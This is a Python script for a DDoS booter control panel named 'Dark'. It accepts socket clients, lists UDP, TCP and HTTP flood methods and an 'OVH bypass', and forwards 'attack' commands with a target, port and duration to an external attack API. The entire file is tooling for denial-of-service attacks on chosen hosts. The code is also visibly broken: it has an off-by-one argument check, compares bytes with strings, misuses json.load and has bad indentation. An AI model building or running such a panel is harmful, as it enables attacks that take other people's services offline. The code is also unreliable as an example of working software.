# -*- coding: utf-8 -*-

import socket
import requests
import threading
import json

server_address = "0.0.0.0" 
port = 9999

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((server_address, port))

def handle(client):
  try:
    client.send("\033[2JWelcome To Dark".encode())
    client.send("╔═══════════════════════\n\r\n\r".encode())
    while True:
      client.send("guest@DARK ➤ ".encode())
      while True:
        cmd=client.recv(1024)
        if cmd == "cls":
          client.send("\033[2JWelcome To Dark".encode())
          client.send("╔═══════════════════════\n\r\n\r".encode())
        elif cmd == "exit":
          client.close()
        elif cmd == "methods":
          client.send("══════════════════════════════════".encode())
          client.send("║ UDP - UDP Protocol Flood".encode())
          client.send("║ TCP - TCP Protocol Flood".encode())
          client.send("║ HTTP - HTTP 1.1 Flood".encode())
          client.send("║ OVH - OVH Server Bypass\n\r\n\r".encode())
        elif cmd.startswith("attack"):
          cmd=cmd.split(" ")
          if len(cmd) != 4:
            client.send("Usage: attack method target port time\n\r\n\r".encode())
          else:
            method = cmd[1]
            target = cmd[2]
            port = cmd[3]
            time = cmd[4]
            with open("data.json", "r") as f:
              data = json.load(f.read())
            if method in data["methods"]:
              r=requests.get(data["api"].replace("<<$target>>", target).replace("<<$port>>", port).replace("<<$time>>", time).replace("<<$method>>", method)).text
              client.send(f"Attack Sent: {r}\n".encode())
   except:
     pass 

sock.listen(1)

print("Dark Net Is Listening For Connections")
while True:
  client, address = sock.accept()
  print(f"Connection From {address[0]}:{address[1]}")
  threading.Thread(target=handle, args=(client)).start()
